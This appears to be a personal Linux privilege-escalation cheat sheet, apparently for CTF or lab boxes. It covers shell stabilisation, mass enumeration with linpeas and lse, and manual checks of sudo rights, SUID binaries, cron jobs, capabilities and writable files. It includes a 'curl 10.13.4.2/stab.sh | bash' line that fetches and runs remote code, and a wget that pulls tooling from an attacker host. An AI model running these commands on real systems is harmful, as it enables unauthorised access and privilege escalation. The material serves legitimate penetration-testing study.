## Fast Mass Enum

shell stabilization (pretty colors :))
cat /etc/shells

PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '


Stabilize shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
or
python -c 'import pty;pty.spawn("/bin/bash")'
( then ctrl + z to background process)
stty -a
stty raw -echo; fg
this sets it on the box ur going into:
stty rows 29 cols 237
export TERM=xterm-256color
(if u wanna set the rows etc)
this checks ur rows and columns in ur current shell:

curl 10.13.4.2/stab.sh | bash
Grab all enum files:
wget -nH -r 10.13.31.108 && rm index.html

Give all execution permission:
chmod +x *.sh

Mass enum oneliner:
/tmp/test/linpeas.sh | tee linpeas.log && /tmp/test/lse.sh -i | tee lse.log

Go through all output:
cat *.log
less -R *.log

## Manual Quick Wins

See what current user has sudo permission for:
sudo -l

Check for kernel exploits:
uname -sr
lsb_release -a

Finds binaries with SUID or SGID bitsets:
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/sbin/exim4
(Use searchsploit and <https://gtfobins.github.io/> on results)

Check cronjobs:
cat /etc/crontab
ls /etc/cron*
cat /etc/cron*
cat /etc/cron.d
cat /var/spool/cron/*

Check processes running:
ps aux | grep root
./pspy64

Check open internal ports:
ss -lntu
ss -ltu

Check files owned by group:
groups
find / -group uwu 2>/dev/null
find / -writable -type d -group gods 2>/dev/null
find / -writable -type f -group gods 2>/dev/null

Check files owned by user:
id
find / -writable -type d -user hades 2>/dev/null
find / -writable -type f -user hades 2>/dev/null

Check enabled capabilities:
getcap -r / 2>/dev/null